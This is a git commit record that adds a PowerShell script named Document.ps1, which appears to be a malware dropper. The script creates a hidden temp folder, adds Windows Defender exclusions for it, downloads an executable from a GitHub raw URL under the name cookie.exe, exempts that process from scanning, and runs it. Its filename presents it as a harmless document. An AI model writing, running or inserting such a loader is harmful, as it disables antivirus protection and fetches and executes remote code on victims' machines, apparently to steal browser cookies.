22ef69899b19526616cf70c4bb08896ef2e448cb
PXTDEV9022 <qnuts1tg222@gmail.com>
2024-12-26 20:59:53 +0700

    Add files via upload

---
+++ Document.ps1
@@ -0,0 +1,9 @@
+$A=[System.IO.Path]::Combine($env:temp,"System")
+if(-not(Test-Path -Path $A)){New-Item -Path $A -ItemType Directory -Force}
+try{Add-MpPreference -ExclusionPath $A}catch{}
+$B="https://raw.githubusercontent.com/blackcodeit407/system/main/cookie.txt"
+$C=[System.IO.Path]::Combine($A,"cookie.exe")
+Invoke-WebRequest -Uri $B -OutFile $C
+try{Add-MpPreference -ExclusionProcess $C}catch{}
+Start-Process -FilePath $C -ArgumentList "-Bypass"
+Exit
